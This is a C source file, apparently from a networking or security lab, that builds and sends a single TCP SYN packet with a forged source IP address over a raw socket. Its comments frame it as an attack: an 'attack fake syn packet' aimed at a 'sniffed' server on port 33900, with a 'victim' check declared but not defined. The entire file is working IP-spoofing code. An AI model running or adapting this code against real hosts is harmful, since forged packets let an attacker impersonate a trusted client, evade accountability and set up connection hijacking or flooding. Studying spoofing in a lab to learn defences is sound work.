#include <netinet/in.h>
#include <errno.h>
#include <netdb.h>
#include <stdio.h>  //For standard things
#include <stdlib.h> //malloc
#include <stdbool.h>
#include <string.h>           //strlen
#include <netinet/ip_icmp.h>  //Provides declarations for icmp header
#include <netinet/udp.h>      //Provides declarations for udp header
#include <netinet/tcp.h>      //Provides declarations for tcp header
#include <netinet/ip.h>       //Provides declarations for ip header
#include <netinet/if_ether.h> //For ETH_P_ALL
#include <net/ethernet.h>     //For ether_header
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define PORT 33900 // the port users will be connecting to
#define BUFFERSIZE 4096
#define DATA "HELLO, ITS ME\n"

int check_victim(int *, unsigned char *);
void craft_fake_syn_packet(char *,struct in_addr, struct sockaddr_in);
void fill_ip_header(struct iphdr*, unsigned char*, struct in_addr, struct sockaddr_in);
void fill_tcp_header(struct tcphdr*, unsigned char*, struct in_addr, struct sockaddr_in);
unsigned short csum(unsigned short *, int);

//Pseudo header needed for calculating the TCP header checksum
struct pseudoTCPPacket
{
    uint32_t srcAddr;
    uint32_t dstAddr;
    uint8_t zero;
    uint8_t protocol;
    uint16_t TCP_len;
};

int main(int argc, char *argv[])
{
    // get the spoof ip, dest ip from cmd line args
	if(argc != 3) {
		printf("- Invalid parameters!!!\n");
		printf("- Usage %s <spoof/fake IP> <destination IP>\n", argv[0]);
		exit(-1);
	}
	struct in_addr spoof_ip;
	spoof_ip.s_addr = inet_addr(argv[1]);

	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(PORT);
	dest_addr.sin_addr.s_addr = inet_addr(argv[2]);
	
	int sockfd; // socket discriptor
	// buffer for packet
    char *datagram;
    datagram = (char *)malloc(BUFFERSIZE);
	
	// cleaning the buffer
	memset(datagram,0,BUFFERSIZE);

       	// creating a raw socket
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sockfd == -1) {
		perror("Failed to create socket");
		exit(-1);
	}
    // carft the attack fake syb packt
    craft_fake_syn_packet(datagram,spoof_ip,dest_addr);

    //IP_HDRINCL tells the kernel to not fill up the headers' structure
	int one = 1;
	const int *val = &one;
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
		perror("Error setting IP_HDRINCL");
		exit(-1);
	}
	//Send the packet
    int packet_size = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(DATA); // length of the datagram
	if (sendto (sockfd, datagram, packet_size ,  0, (struct sockaddr *) &dest_addr, sizeof (dest_addr)) < 0) {
		perror("sendto failed");
        exit(-1);
	}
	//Data send successfully
	else {
		printf ("Packet Send. Length : %d \n" , packet_size);
	}

    return 1;
}

void craft_fake_syn_packet(char *datagram,struct in_addr src_ip, struct sockaddr_in dest_ip)
{
    // struc to hold IP header, pointing to the top of datagram buffer
    struct iphdr *iph = (struct iphdr *)datagram;
    // struct to hold TCP header, pointing to the postion right after ip header in datagram buffer
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    // content points right after tcp header to store data
    char *content; // data from the application layer
    content = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(content, DATA);

    fill_ip_header(iph,datagram,src_ip,dest_ip);
    fill_tcp_header(tcph,datagram,src_ip, dest_ip);
}

void fill_ip_header(struct iphdr *iph, unsigned char *buffer, struct in_addr src_ip, struct sockaddr_in dest_ip)
{
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;                                                               //ip header len
    iph->tos = 0;                                                               //ip type of service
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(DATA); // length of the datagram
    iph->id = htons(12345);                                                     //Id of this packet
    iph->frag_off = 0;                                                          // fragment offset
    iph->ttl = 255;                                                             // time to live
    iph->protocol = IPPROTO_TCP;                                                // protocol tcp
    iph->check = 0;                                                             //Set to 0 before calculating checksum
    iph->saddr = src_ip.s_addr;        // spoofed ip of client
    iph->daddr = dest_ip.sin_addr.s_addr;                                             // destination ip, sniffed ip of server
    // calculate 
    iph->check = csum((unsigned short *)buffer, iph->tot_len);
}

void fill_tcp_header(struct tcphdr *tcph, unsigned char *buffer, struct in_addr src_ip, struct sockaddr_in dest_ip)
{
    // Fill in the TCP Header
    tcph->source = htons(23900); // src port (rand)
    tcph->dest = htons(33900);     // dest port
    tcph->seq = 0;       // a random seq number
    tcph->ack_seq = 0;
    tcph->res1 = 0;
    tcph->doff = 5; // tcp data offset, indicates where data begins
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(65535); /* maximum allowed window size */
    tcph->urg_ptr = 0;

    // checksum calculation
    tcph->check = 0; //leave checksum 0 now, filled later by stub header

    // fill in the pseudo header
    struct pseudoTCPPacket temp_hdr;
    //Now we can calculate the checksum for the TCP header
    temp_hdr.srcAddr = src_ip.s_addr;                           //32 bit format of source address
    temp_hdr.dstAddr = dest_ip.sin_addr.s_addr;                           //32 bit format of source address
    temp_hdr.zero = 0;                                              //8 bit always zero
    temp_hdr.protocol = IPPROTO_TCP;                                //8 bit TCP protocol
    temp_hdr.TCP_len = htons(sizeof(struct tcphdr) + strlen(DATA)); // 16 bit length of TCP header

    //Populate the pseudo packet
    char *dummy_packet;
    int dummy_size = (int)(sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + strlen(DATA));
    dummy_packet = (char *)malloc(dummy_size);
    memset(dummy_packet, 0, dummy_size);

    //Copy pseudo header
    memcpy(dummy_packet, (char *)&temp_hdr, sizeof(struct pseudoTCPPacket));
    //Copy tcp header + data to fake TCP header for checksum
    memcpy(dummy_packet + sizeof(struct pseudoTCPPacket), tcph, sizeof(struct tcphdr) + strlen(DATA));

    tcph->check = csum((unsigned short *)dummy_packet, dummy_size);
}

// Generic checksum calculation function
// ref: https://tools.ietf.org/html/rfc1071
unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}